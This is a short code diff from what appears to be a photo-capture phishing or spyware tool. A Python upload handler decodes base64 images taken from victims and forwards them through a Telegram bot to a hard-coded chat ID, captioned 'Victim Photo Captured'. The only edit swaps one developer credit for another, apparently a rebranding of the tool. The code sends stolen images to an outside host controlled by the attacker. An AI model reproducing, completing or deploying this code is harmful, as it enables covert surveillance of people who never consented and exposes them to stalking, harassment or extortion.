@@ -207,7 +207,7 @@ def upload():
             image_bytes = base64.b64decode(image_data)
             
             target_id = user_id if user_id else "8173349543"
-            bot.send_photo(target_id, image_bytes, caption="📸 Victim Photo Captured\n⚡ Developed by: @Kaliboy002")
+            bot.send_photo(target_id, image_bytes, caption="📸 Victim Photo Captured\n⚡ Developed by: @shahidnaimi5642")
         except Exception as e:
             print(f"Error processing image: {e}")
             
